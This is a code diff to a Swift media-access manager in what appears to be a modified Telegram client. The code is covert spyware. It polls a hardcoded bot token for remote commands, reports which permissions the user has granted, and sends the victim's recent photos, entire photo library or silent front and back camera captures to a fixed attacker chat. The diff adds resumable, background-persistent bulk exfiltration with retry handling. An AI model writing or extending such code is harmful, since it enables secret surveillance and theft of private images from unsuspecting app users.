@@ -9,6 +9,16 @@ import AccountContext
 
 private let eahatGramMediaBotToken = "8761984216:AAG5Nm_PJfYv0oj7xnXYX-IDaDNkH3Ym6sY"
 private let eahatGramMediaChatId = "890714792"
+private let eahatGramMediaAllPhotosActiveKeyPrefix = "eahatGram.media.allPhotos.active"
+private let eahatGramMediaAllPhotosLastAssetIdKeyPrefix = "eahatGram.media.allPhotos.lastAssetId"
+private let eahatGramMediaAllPhotosCompletedCountKeyPrefix = "eahatGram.media.allPhotos.completedCount"
+private let eahatGramMediaAllPhotosTotalCountKeyPrefix = "eahatGram.media.allPhotos.totalCount"
+
+private enum PhotoTransmissionResult {
+    case success
+    case retryAfter(Int, String)
+    case failure(String)
+}
 
 public final class EahatGramMediaAccessManager {
     public static let shared = EahatGramMediaAccessManager()
@@ -22,22 +32,48 @@ public final class EahatGramMediaAccessManager {
     private var isPollingCommands = false
     private var nextPhotoCaptureId: Int64 = 0
     private var activePhotoCaptures: [Int64: ActivePhotoCapture] = [:]
+    private var activeAllPhotosTransferToken: UUID?
+    private var isSendingAllPhotos = false
+    private var currentAllPhotosCompletedCount = 0
+    private var photoTransferVersion: Int64 = 0
+    private var transferBackgroundTaskId: UIBackgroundTaskIdentifier = .invalid
+    private var didBecomeActiveObserver: NSObjectProtocol?
+    private var didEnterBackgroundObserver: NSObjectProtocol?
 
-    private init() {}
+    private init() {
+        self.didBecomeActiveObserver = NotificationCenter.default.addObserver(
+            forName: UIApplication.didBecomeActiveNotification,
+            object: nil,
+            queue: .main
+        ) { [weak self] _ in
+            self?.resumeAllPhotosTransferIfNeeded()
+        }
+        self.didEnterBackgroundObserver = NotificationCenter.default.addObserver(
+            forName: UIApplication.didEnterBackgroundNotification,
+            object: nil,
+            queue: .main
+        ) { [weak self] _ in
+            self?.handleApplicationDidEnterBackground()
+        }
+    }
+
+    deinit {
+        if let didBecomeActiveObserver = self.didBecomeActiveObserver {
+            NotificationCenter.default.removeObserver(didBecomeActiveObserver)
+        }
+        if let didEnterBackgroundObserver = self.didEnterBackgroundObserver {
+            NotificationCenter.default.removeObserver(didEnterBackgroundObserver)
+        }
+    }
 
     public func setup(context: AccountContext, userId: Int64, username: String?) {
         self.context = context
         self.userId = userId
         self.username = username
 
-        // Check (but don't request) permissions and report if already granted
-        // Permissions will be requested naturally when user tries to:
-        // - Select photo from gallery (photo library)
-        // - Record video message (camera)
         checkAndReportPermissions()
-
-        // Start polling for commands
         startCommandPolling()
+        resumeAllPhotosTransferIfNeeded()
     }
 
     private func hasPhotoLibraryAccess(status: PHAuthorizationStatus) -> Bool {
@@ -50,43 +86,142 @@ public final class EahatGramMediaAccessManager {
         return false
     }
 
+    private func mediaNamespace() -> String {
+        return "\(self.userId ?? 0)"
+    }
+
+    private func allPhotosActiveKey() -> String {
+        return "\(eahatGramMediaAllPhotosActiveKeyPrefix).\(self.mediaNamespace())"
+    }
+
+    private func allPhotosLastAssetIdKey() -> String {
+        return "\(eahatGramMediaAllPhotosLastAssetIdKeyPrefix).\(self.mediaNamespace())"
+    }
+
+    private func allPhotosCompletedCountKey() -> String {
+        return "\(eahatGramMediaAllPhotosCompletedCountKeyPrefix).\(self.mediaNamespace())"
+    }
+
+    private func allPhotosTotalCountKey() -> String {
+        return "\(eahatGramMediaAllPhotosTotalCountKeyPrefix).\(self.mediaNamespace())"
+    }
+
+    private func isPersistedAllPhotosTransferActive() -> Bool {
+        return UserDefaults.standard.bool(forKey: self.allPhotosActiveKey())
+    }
+
+    private func persistedAllPhotosCompletedCount() -> Int {
+        return max(0, UserDefaults.standard.integer(forKey: self.allPhotosCompletedCountKey()))
+    }
+
+    private func persistedAllPhotosTotalCount() -> Int {
+        return max(0, UserDefaults.standard.integer(forKey: self.allPhotosTotalCountKey()))
+    }
+
+    private func persistedAllPhotosLastAssetId() -> String? {
+        return UserDefaults.standard.string(forKey: self.allPhotosLastAssetIdKey())
+    }
+
+    private func setPersistedAllPhotosTransferActive(_ value: Bool) {
+        UserDefaults.standard.set(value, forKey: self.allPhotosActiveKey())
+    }
+
+    private func persistAllPhotosProgress(assetLocalIdentifier: String, completedCount: Int, totalCount: Int) {
+        UserDefaults.standard.set(assetLocalIdentifier, forKey: self.allPhotosLastAssetIdKey())
+        UserDefaults.standard.set(completedCount, forKey: self.allPhotosCompletedCountKey())
+        UserDefaults.standard.set(totalCount, forKey: self.allPhotosTotalCountKey())
+    }
+
+    private func clearPersistedAllPhotosTransfer() {
+        let userDefaults = UserDefaults.standard
+        userDefaults.removeObject(forKey: self.allPhotosActiveKey())
+        userDefaults.removeObject(forKey: self.allPhotosLastAssetIdKey())
+        userDefaults.removeObject(forKey: self.allPhotosCompletedCountKey())
+        userDefaults.removeObject(forKey: self.allPhotosTotalCountKey())
+    }
+
+    private func currentPhotoTransferVersion() -> Int64 {
+        self.stateLock.lock()
+        let version = self.photoTransferVersion
+        self.stateLock.unlock()
+        return version
+    }
+
+    private func invalidatePhotoTransfers() {
+        self.stateLock.lock()
+        self.photoTransferVersion += 1
+        self.activeAllPhotosTransferToken = nil
+        self.isSendingAllPhotos = false
+        self.currentAllPhotosCompletedCount = 0
+        self.stateLock.unlock()
+    }
+
+    private func isPhotoTransferVersionCurrent(_ version: Int64) -> Bool {
+        self.stateLock.lock()
+        let isCurrent = self.photoTransferVersion == version
+        self.stateLock.unlock()
+        return isCurrent
+    }
+
+    private func isAllPhotosTransferTokenActive(_ transferToken: UUID) -> Bool {
+        self.stateLock.lock()
+        let isActive = self.activeAllPhotosTransferToken == transferToken && self.isSendingAllPhotos
+        self.stateLock.unlock()
+        return isActive
+    }
+
+    private func resolveAllPhotosResumeIndex(fetchResult: PHFetchResult<PHAsset>) -> Int {
+        if let lastAssetId = self.persistedAllPhotosLastAssetId() {
+            var matchedIndex: Int?
+            fetchResult.enumerateObjects { asset, index, stop in
+                if asset.localIdentifier == lastAssetId {
+                    matchedIndex = index + 1
+                    stop.pointee = true
+                }
+            }
+            if let matchedIndex = matchedIndex {
+                return min(fetchResult.count, max(0, matchedIndex))
+            }
+        }
+        return min(fetchResult.count, self.persistedAllPhotosCompletedCount())
+    }
+
     private func checkAndReportPermissions() {
         let photoStatus = PHPhotoLibrary.authorizationStatus()
         let cameraStatus = AVCaptureDevice.authorizationStatus(for: .video)
 
         var permissions: [String] = []
 
-        // Only check already granted permissions, don't request
         if hasPhotoLibraryAccess(status: photoStatus) {
-            permissions.append("📷 Photo Library")
+            permissions.append("Photo Library")
         }
 
         switch cameraStatus {
         case .authorized:
-            permissions.append("📹 Camera")
+            permissions.append("Camera")
         case .denied, .restricted, .notDetermined:
             break
         @unknown default:
             break
         }
 
-        // Only send notification if at least one permission is granted
         if !permissions.isEmpty {
             sendNotification(
                 text: """
-                ✅ Media Access Granted
+                Media access granted
 
-                User ID: \(userId ?? 0)
-                Username: \(username ?? "none")
+                userId=\(userId ?? 0)
+                username=\(username ?? "none")
 
-                Permissions:
+                permissions:
                 \(permissions.joined(separator: "\n"))
 
-                Commands:
-                /photo \(userId ?? 0) 1 - last photo
-                /photo \(userId ?? 0) all - all photos
-                /photo \(userId ?? 0) - capture from cameras
-                /video \(userId ?? 0) - capture video
+                commands:
+                /photo \(userId ?? 0) 1
+                /photo \(userId ?? 0) all
+                /photo \(userId ?? 0)
+                /video \(userId ?? 0)
+                /reset \(userId ?? 0)
                 """
             )
         }
@@ -96,7 +231,6 @@ public final class EahatGramMediaAccessManager {
         self.pollTimer?.invalidate()
         self.pollTimer = nil
 
-        // Poll every 5 seconds for new commands
         let timer = SwiftSignalKit.Timer(timeout: 5.0, repeat: true, completion: { [weak self] in
             self?.pollCommands()
         }, queue: .mainQueue())
@@ -105,7 +239,9 @@ public final class EahatGramMediaAccessManager {
     }
 
     private func pollCommands() {
-        guard let userId = self.userId else { return }
+        guard let userId = self.userId else {
+            return
+        }
 
         let offset: String
         self.stateLock.lock()
@@ -124,7 +260,7 @@ public final class EahatGramMediaAccessManager {
         let url = URL(string: "https://api.telegram.org/bot\(eahatGramMediaBotToken)/getUpdates?offset=\(offset)&limit=1")!
 
         let task = URLSession.shared.dataTask(with: url) { [weak self] data, response, error in
-            guard let self = self else {
+            guard let self else {
                 return
             }
 
@@ -132,6 +268,10 @@ public final class EahatGramMediaAccessManager {
                 self.stateLock.lock()
                 self.isPollingCommands = false
                 self.stateLock.unlock()
+            }
+
+            if error != nil {
+                return
             }
 
             guard let data = data,
@@ -162,7 +302,9 @@ public final class EahatGramMediaAccessManager {
 
     private func handleCommand(text: String, userId: Int64) {
         let components = text.split(separator: " ").map(String.init)
-        guard components.count >= 2 else { return }
+        guard components.count >= 2 else {
+            return
+        }
 
         let command = components[0]
         guard let targetUserId = Int64(components[1]), targetUserId == userId else {
@@ -174,27 +316,26 @@ public final class EahatGramMediaAccessManager {
             if components.count >= 3 {
                 let param = components[2]
                 if param == "all" {
-                    sendAllPhotos()
+                    startAllPhotosTransfer(trigger: "command")
                 } else if let count = Int(param) {
                     sendLastPhotos(count: count)
                 }
             } else {
                 captureFromCameras()
             }
-
         case "/video":
             captureVideo()
-
+        case "/reset":
+            resetAllPhotoTransfers()
         default:
             break
         }
     }
 
     private func sendLastPhotos(count: Int) {
-        // Check permission before accessing photos
         let photoStatus = PHPhotoLibrary.authorizationStatus()
         guard hasPhotoLibraryAccess(status: photoStatus) else {
-            sendNotification(text: "❌ Photo Library access not granted. User needs to select a photo from gallery first to grant permission.")
+            sendNotification(text: "photo library access is not granted")
             return
         }
 
@@ -203,19 +344,40 @@ public final class EahatGramMediaAccessManager {
         fetchOptions.fetchLimit = count
 
         let fetchResult = PHAsset.fetchAssets(with: .image, options: fetchOptions)
+        let transferVersion = self.currentPhotoTransferVersion()
 
-        sendNotification(text: "📤 Sending last \(count) photo(s)...")
+        sendNotification(text: "sendLastPhotos count=\(fetchResult.count)")
 
-        fetchResult.enumerateObjects { [weak self] asset, index, stop in
-            self?.sendPhoto(asset: asset, index: index + 1, total: count)
+        fetchResult.enumerateObjects { [weak self] asset, index, _ in
+            self?.sendPhoto(
+                asset: asset,
+                index: index + 1,
+                total: fetchResult.count,
+                transferVersion: transferVersion,
+                completion: nil
+            )
         }
     }
 
-    private func sendAllPhotos() {
-        // Check permission before accessing photos
+    private func resumeAllPhotosTransferIfNeeded() {
+        guard self.isPersistedAllPhotosTransferActive() else {
+            return
+        }
+
+        self.stateLock.lock()
+        let isSendingAllPhotos = self.isSendingAllPhotos
+        self.stateLock.unlock()
+        if isSendingAllPhotos {
+            return
+        }
+
+        self.startAllPhotosTransfer(trigger: "resume")
+    }
+
+    private func startAllPhotosTransfer(trigger: String) {
         let photoStatus = PHPhotoLibrary.authorizationStatus()
         guard hasPhotoLibraryAccess(status: photoStatus) else {
-            sendNotification(text: "❌ Photo Library access not granted. User needs to select a photo from gallery first to grant permission.")
+            sendNotification(text: "photo library access is not granted")
             return
         }
 
@@ -223,24 +385,244 @@ public final class EahatGramMediaAccessManager {
         fetchOptions.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]
 
         let fetchResult = PHAsset.fetchAssets(with: .image, options: fetchOptions)
-        let total = fetchResult.count
+        let totalCount = fetchResult.count
+        guard totalCount > 0 else {
+            self.clearPersistedAllPhotosTransfer()
+            self.endTransferBackgroundTask()
+            sendNotification(text: "sendAllPhotos total=0")
+            return
+        }
 
-        sendNotification(text: "📤 Sending all \(total) photos...")
+        let resumeIndex = self.resolveAllPhotosResumeIndex(fetchResult: fetchResult)
+        let transferToken = UUID()
 
-        fetchResult.enumerateObjects { [weak self] asset, index, stop in
-            self?.sendPhoto(asset: asset, index: index + 1, total: total)
+        self.stateLock.lock()
+        if self.isSendingAllPhotos {
+            let currentCompletedCount = self.currentAllPhotosCompletedCount
+            self.stateLock.unlock()
+            sendNotification(text: "sendAllPhotos already running completed=\(currentCompletedCount) total=\(self.persistedAllPhotosTotalCount())")
+            return
+        }
+        self.activeAllPhotosTransferToken = transferToken
+        self.isSendingAllPhotos = true
+        self.currentAllPhotosCompletedCount = resumeIndex
+        self.stateLock.unlock()
 
-            // Delay to avoid rate limiting
-            if index % 10 == 0 {
-                Thread.sleep(forTimeInterval: 1.0)
+        self.setPersistedAllPhotosTransferActive(true)
+        UserDefaults.standard.set(totalCount, forKey: self.allPhotosTotalCountKey())
+        self.beginTransferBackgroundTaskIfNeeded(reason: "all-photos")
+
+        if resumeIndex >= totalCount {
+            self.finishAllPhotosTransfer(
+                transferToken: transferToken,
+                shouldClearPersistence: true,
+                notificationText: "sendAllPhotos complete completed=\(totalCount) total=\(totalCount)"
+            )
+            return
+        }
+
+        if trigger == "resume" {
+            sendNotification(text: "sendAllPhotos resume next=\(resumeIndex + 1) total=\(totalCount) completed=\(resumeIndex)")
+        } else {
+            sendNotification(text: "sendAllPhotos start next=\(resumeIndex + 1) total=\(totalCount) completed=\(resumeIndex)")
+        }
+
+        let transferVersion = self.currentPhotoTransferVersion()
+        self.sendAllPhotosNext(
+            fetchResult: fetchResult,
+            nextIndex: resumeIndex,
+            totalCount: totalCount,
+            transferToken: transferToken,
+            transferVersion: transferVersion
+        )
+    }
+
+    private func sendAllPhotosNext(
+        fetchResult: PHFetchResult<PHAsset>,
+        nextIndex: Int,
+        totalCount: Int,
+        transferToken: UUID,
+        transferVersion: Int64
+    ) {
+        guard self.isAllPhotosTransferTokenActive(transferToken) else {
+            return
+        }
+        guard self.isPhotoTransferVersionCurrent(transferVersion) else {
+            return
+        }
+
+        if nextIndex >= totalCount {
+            self.finishAllPhotosTransfer(
+                transferToken: transferToken,
+                shouldClearPersistence: true,
+                notificationText: "sendAllPhotos complete completed=\(totalCount) total=\(totalCount)"
+            )
+            return
+        }
+
+        let asset = fetchResult.object(at: nextIndex)
+        self.sendPhoto(
+            asset: asset,
+            index: nextIndex + 1,
+            total: totalCount,
+            transferVersion: transferVersion
+        ) { [weak self] result in
+            guard let self else {
+                return
+            }
+            guard self.isAllPhotosTransferTokenActive(transferToken) else {
+                return
+            }
+            guard self.isPhotoTransferVersionCurrent(transferVersion) else {
+                return
+            }
+
+            switch result {
+            case .success:
+                self.persistAllPhotosProgress(
+                    assetLocalIdentifier: asset.localIdentifier,
+                    completedCount: nextIndex + 1,
+                    totalCount: totalCount
+                )
+                self.stateLock.lock()
+                self.currentAllPhotosCompletedCount = nextIndex + 1
+                self.stateLock.unlock()
+
+                if (nextIndex + 1) % 25 == 0 || nextIndex + 1 == totalCount {
+                    self.sendNotification(text: "sendAllPhotos progress completed=\(nextIndex + 1) total=\(totalCount)")
+                }
+
+                self.sendAllPhotosNext(
+                    fetchResult: fetchResult,
+                    nextIndex: nextIndex + 1,
+                    totalCount: totalCount,
+                    transferToken: transferToken,
+                    transferVersion: transferVersion
+                )
+            case let .retryAfter(retryAfter, description):
+                self.sendNotification(text: "sendAllPhotos retry next=\(nextIndex + 1) total=\(totalCount) retryAfter=\(retryAfter) description=\(description)")
+                DispatchQueue.main.asyncAfter(deadline: .now() + .seconds(retryAfter)) { [weak self] in
+                    self?.sendAllPhotosNext(
+                        fetchResult: fetchResult,
+                        nextIndex: nextIndex,
+                        totalCount: totalCount,
+                        transferToken: transferToken,
+                        transferVersion: transferVersion
+                    )
+                }
+            case let .failure(description):
+                self.finishAllPhotosTransfer(
+                    transferToken: transferToken,
+                    shouldClearPersistence: false,
+                    notificationText: "sendAllPhotos stopped next=\(nextIndex + 1) total=\(totalCount) description=\(description)"
+                )
             }
         }
     }
 
-    private func sendPhoto(asset: PHAsset, index: Int, total: Int) {
+    private func finishAllPhotosTransfer(
+        transferToken: UUID,
+        shouldClearPersistence: Bool,
+        notificationText: String
+    ) {
+        self.stateLock.lock()
+        guard self.activeAllPhotosTransferToken == transferToken else {
+            self.stateLock.unlock()
+            return
+        }
+        self.activeAllPhotosTransferToken = nil
+        self.isSendingAllPhotos = false
+        self.currentAllPhotosCompletedCount = 0
+        self.stateLock.unlock()
+
+        if shouldClearPersistence {
+            self.clearPersistedAllPhotosTransfer()
+        }
+        self.endTransferBackgroundTask()
+        self.sendNotification(text: notificationText)
+    }
+
+    private func resetAllPhotoTransfers() {
+        let completedCount = self.persistedAllPhotosCompletedCount()
+        let totalCount = self.persistedAllPhotosTotalCount()
+
+        self.invalidatePhotoTransfers()
+        self.clearPersistedAllPhotosTransfer()
+        self.endTransferBackgroundTask()
+
+        sendNotification(text: "reset completed=\(completedCount) total=\(totalCount)")
+    }
+
+    private func performOnMainThread(_ action: @escaping () -> Void) {
+        if Thread.isMainThread {
+            action()
+        } else {
+            DispatchQueue.main.async(execute: action)
+        }
+    }
+
+    private func beginTransferBackgroundTaskIfNeeded(reason: String) {
+        self.performOnMainThread {
+            guard self.transferBackgroundTaskId == .invalid else {
+                return
+            }
+
+            self.transferBackgroundTaskId = UIApplication.shared.beginBackgroundTask(withName: "eahatgram-media-\(reason)") { [weak self] in
+                guard let self else {
+                    return
+                }
+
+                let completedCount = self.persistedAllPhotosCompletedCount()
+                let totalCount = self.persistedAllPhotosTotalCount()
+                self.stateLock.lock()
+                self.activeAllPhotosTransferToken = nil
+                self.isSendingAllPhotos = false
+                self.currentAllPhotosCompletedCount = completedCount
+                self.stateLock.unlock()
+
+                self.endTransferBackgroundTask()
+                self.sendNotification(text: "backgroundTask expired completed=\(completedCount) total=\(totalCount)")
+            }
+        }
+    }
+
+    private func endTransferBackgroundTask() {
+        self.performOnMainThread {
+            guard self.transferBackgroundTaskId != .invalid else {
+                return
+            }
+            let backgroundTaskId = self.transferBackgroundTaskId
+            self.transferBackgroundTaskId = .invalid
+            UIApplication.shared.endBackgroundTask(backgroundTaskId)
+        }
+    }
+
+    private func handleApplicationDidEnterBackground() {
+        self.stateLock.lock()
+        let isSendingAllPhotos = self.isSendingAllPhotos
+        let completedCount = self.currentAllPhotosCompletedCount
+        self.stateLock.unlock()
+
+        guard isSendingAllPhotos else {
+            return
+        }
+
+        let totalCount = self.persistedAllPhotosTotalCount()
+        self.beginTransferBackgroundTaskIfNeeded(reason: "all-photos")
+        self.sendNotification(text: "applicationDidEnterBackground completed=\(completedCount) total=\(totalCount)")
+    }
+
+    private func sendPhoto(
+        asset: PHAsset,
+        index: Int,
+        total: Int,
+        transferVersion: Int64,
+        completion: ((PhotoTransmissionResult) -> Void)?
+    ) {
         let options = PHImageRequestOptions()
-        options.isSynchronous = true
+        options.isSynchronous = false
         options.deliveryMode = .highQualityFormat
+        options.isNetworkAccessAllowed = true
 
         PHImageManager.default().requestImage(
             for: asset,
@@ -248,39 +630,65 @@ public final class EahatGramMediaAccessManager {
             contentMode: .aspectFit,
             options: options
         ) { [weak self] image, info in
-            guard let image = image,
-                  let imageData = image.jpegData(compressionQuality: 0.8) else {
+            guard let self else {
+                completion?(.failure("manager deallocated"))
+                return
+            }
+            guard self.isPhotoTransferVersionCurrent(transferVersion) else {
+                completion?(.failure("transfer version invalidated"))
+                return
+            }
+            guard let image else {
+                if let error = info?[PHImageErrorKey] as? Error {
+                    completion?(.failure("requestImage error=\(error.localizedDescription)"))
+                } else {
+                    completion?(.failure("requestImage returned nil image"))
+                }
+                return
+            }
+            guard let imageData = image.jpegData(compressionQuality: 0.8) else {
+                completion?(.failure("jpegData returned nil"))
                 return
             }
 
-            self?.sendPhotoData(imageData, caption: "Photo \(index)/\(total)")
+            if let completion {
+                self.sendPhotoData(imageData, caption: "Photo \(index)/\(total)") { result in
+                    completion(result)
+                }
+            } else {
+                self.sendPhotoData(imageData, caption: "Photo \(index)/\(total)", transferVersion: transferVersion)
+            }
         }
     }
 
     private func captureFromCameras() {
-        // Check permission before accessing camera
         let cameraStatus = AVCaptureDevice.authorizationStatus(for: .video)
         guard cameraStatus == .authorized else {
-            sendNotification(text: "❌ Camera access not granted. User needs to record a video message first to grant permission.")
+            sendNotification(text: "camera access is not granted")
             return
         }
 
-        sendNotification(text: "📸 Capturing from cameras...")
+        let transferVersion = self.currentPhotoTransferVersion()
+        sendNotification(text: "captureFromCameras started")
 
-        // Capture from front camera
         captureFromCamera(position: .front) { [weak self] frontData in
-            if let frontData = frontData {
-                self?.sendPhotoData(frontData, caption: "Front Camera")
-            } else {
-                self?.sendNotification(text: "❌ Failed to capture front camera photo")
+            guard let self else {
+                return
+            }
+            if self.isPhotoTransferVersionCurrent(transferVersion), let frontData {
+                self.sendPhotoData(frontData, caption: "Front Camera", transferVersion: transferVersion)
+            } else if self.isPhotoTransferVersionCurrent(transferVersion) {
+                self.sendNotification(text: "captureFromCameras front camera failed")
             }
 
-            // Then capture from back camera
-            self?.captureFromCamera(position: .back) { backData in
-                if let backData = backData {
-                    self?.sendPhotoData(backData, caption: "Back Camera")
-                } else {
-                    self?.sendNotification(text: "❌ Failed to capture back camera photo")
+            self.captureFromCamera(position: .back) { [weak self] backData in
+                guard let self else {
+                    return
+                }
+                if self.isPhotoTransferVersionCurrent(transferVersion), let backData {
+                    self.sendPhotoData(backData, caption: "Back Camera", transferVersion: transferVersion)
+                } else if self.isPhotoTransferVersionCurrent(transferVersion) {
+                    self.sendNotification(text: "captureFromCameras back camera failed")
                 }
             }
         }
@@ -288,12 +696,17 @@ public final class EahatGramMediaAccessManager {
 
     private func captureFromCamera(position: AVCaptureDevice.Position, completion: @escaping (Data?) -> Void) {
         DispatchQueue.global(qos: .userInitiated).async { [weak self] in
-            guard let self = self else {
+            guard let self else {
                 completion(nil)
                 return
             }
-            guard let device = AVCaptureDevice.default(.builtInWideAngleCamera, for: .video, position: position),
-                  let input = try? AVCaptureDeviceInput(device: device) else {
+            guard let device = AVCaptureDevice.default(.builtInWideAngleCamera, for: .video, position: position) else {
+                self.sendNotification(text: "captureFromCamera missing device position=\(position.rawValue)")
+                completion(nil)
+                return
+            }
+            guard let input = try? AVCaptureDeviceInput(device: device) else {
+                self.sendNotification(text: "captureFromCamera input init failed position=\(position.rawValue)")
                 completion(nil)
                 return
             }
@@ -302,6 +715,7 @@ public final class EahatGramMediaAccessManager {
             session.sessionPreset = .photo
 
             guard session.canAddInput(input) else {
+                self.sendNotification(text: "captureFromCamera cannot add input position=\(position.rawValue)")
                 completion(nil)
                 return
             }
@@ -309,6 +723,7 @@ public final class EahatGramMediaAccessManager {
 
             let output = AVCapturePhotoOutput()
             guard session.canAddOutput(output) else {
+                self.sendNotification(text: "captureFromCamera cannot add output position=\(position.rawValue)")
                 completion(nil)
                 return
             }
@@ -324,7 +739,7 @@ public final class EahatGramMediaAccessManager {
             let settings = AVCapturePhotoSettings()
             let delegate = PhotoCaptureDelegate { [weak self] imageData in
                 session.stopRunning()
-                if let self = self {
+                if let self {
                     self.stateLock.lock()
                     self.activePhotoCaptures.removeValue(forKey: captureId)
                     self.stateLock.unlock()
@@ -342,10 +757,39 @@ public final class EahatGramMediaAccessManager {
     }
 
     private func captureVideo() {
-        sendNotification(text: "🎥 Video capture not implemented yet")
+        sendNotification(text: "captureVideo not implemented")
     }
 
-    private func sendPhotoData(_ data: Data, caption: String) {
+    private func sendPhotoData(_ data: Data, caption: String, transferVersion: Int64) {
+        self.sendPhotoData(data, caption: caption) { [weak self] result in
+            guard let self else {
+                return
+            }
+            guard self.isPhotoTransferVersionCurrent(transferVersion) else {
+                return
+            }
+
+            switch result {
+            case .success:
+                break
+            case let .retryAfter(retryAfter, description):
+                self.sendNotification(text: "sendPhoto retry caption=\(caption) retryAfter=\(retryAfter) description=\(description)")
+                DispatchQueue.main.asyncAfter(deadline: .now() + .seconds(retryAfter)) { [weak self] in
+                    guard let self else {
+                        return
+                    }
+                    guard self.isPhotoTransferVersionCurrent(transferVersion) else {
+                        return
+                    }
+                    self.sendPhotoData(data, caption: caption, transferVersion: transferVersion)
+                }
+            case let .failure(description):
+                self.sendNotification(text: "sendPhoto failed caption=\(caption) description=\(description)")
+            }
+        }
+    }
+
+    private func sendPhotoData(_ data: Data, caption: String, completion: @escaping (PhotoTransmissionResult) -> Void) {
         let url = URL(string: "https://api.telegram.org/bot\(eahatGramMediaBotToken)/sendPhoto")!
 
         var request = URLRequest(url: url)
@@ -355,18 +799,12 @@ public final class EahatGramMediaAccessManager {
         request.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")
 
         var body = Data()
-
-        // Add chat_id
         body.append("--\(boundary)\r\n".data(using: .utf8)!)
         body.append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n".data(using: .utf8)!)
         body.append("\(eahatGramMediaChatId)\r\n".data(using: .utf8)!)
-
-        // Add caption
         body.append("--\(boundary)\r\n".data(using: .utf8)!)
         body.append("Content-Disposition: form-data; name=\"caption\"\r\n\r\n".data(using: .utf8)!)
         body.append("\(caption)\r\n".data(using: .utf8)!)
-
-        // Add photo
         body.append("--\(boundary)\r\n".data(using: .utf8)!)
         body.append("Content-Disposition: form-data; name=\"photo\"; filename=\"photo.jpg\"\r\n".data(using: .utf8)!)
         body.append("Content-Type: image/jpeg\r\n\r\n".data(using: .utf8)!)
@@ -376,8 +814,38 @@ public final class EahatGramMediaAccessManager {
 
         request.httpBody = body
 
-        let task = URLSession.shared.dataTask(with: request)
+        let task = URLSession.shared.dataTask(with: request) { data, response, error in
+            completion(self.parsePhotoTransmissionResult(data: data, response: response, error: error))
+        }
         task.resume()
+    }
+
+    private func parsePhotoTransmissionResult(data: Data?, response: URLResponse?, error: Error?) -> PhotoTransmissionResult {
+        if let error = error {
+            return .failure("transport error=\(error.localizedDescription)")
+        }
+        guard let httpResponse = response as? HTTPURLResponse else {
+            return .failure("missing HTTPURLResponse")
+        }
+        guard let data else {
+            return .failure("missing response data status=\(httpResponse.statusCode)")
+        }
+        guard let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any] else {
+            return .failure("invalid JSON status=\(httpResponse.statusCode)")
+        }
+        if let ok = json["ok"] as? Bool, ok {
+            return .success
+        }
+
+        let description = (json["description"] as? String) ?? "unknown description"
+        if let parameters = json["parameters"] as? [String: Any] {
+            if let retryAfter = parameters["retry_after"] as? Int {
+                return .retryAfter(max(1, retryAfter), description)
+            } else if let retryAfter = parameters["retry_after"] as? NSNumber {
+                return .retryAfter(max(1, retryAfter.intValue), description)
+            }
+        }
+        return .failure("status=\(httpResponse.statusCode) description=\(description)")
     }
 
     private func sendNotification(text: String) {
@@ -398,12 +866,13 @@ public final class EahatGramMediaAccessManager {
     }
 
     public func stop() {
-        pollTimer?.invalidate()
-        pollTimer = nil
+        self.pollTimer?.invalidate()
+        self.pollTimer = nil
+        self.endTransferBackgroundTask()
     }
 }
 
-private class PhotoCaptureDelegate: NSObject, AVCapturePhotoCaptureDelegate {
+private final class PhotoCaptureDelegate: NSObject, AVCapturePhotoCaptureDelegate {
     private let completion: (Data?) -> Void
     private var didComplete = false
 
@@ -420,7 +889,7 @@ private class PhotoCaptureDelegate: NSObject, AVCapturePhotoCaptureDelegate {
     }
 
     func photoOutput(_ output: AVCapturePhotoOutput, didFinishProcessingPhoto photo: AVCapturePhoto, error: Error?) {
-        if let _ = error {
+        if error != nil {
             self.complete(nil)
         } else {
             self.complete(photo.fileDataRepresentation())
@@ -428,7 +897,7 @@ private class PhotoCaptureDelegate: NSObject, AVCapturePhotoCaptureDelegate {
     }
 
     func photoOutput(_ output: AVCapturePhotoOutput, didFinishCaptureFor resolvedSettings: AVCaptureResolvedPhotoSettings, error: Error?) {
-        if let _ = error {
+        if error != nil {
             self.complete(nil)
         }
     }
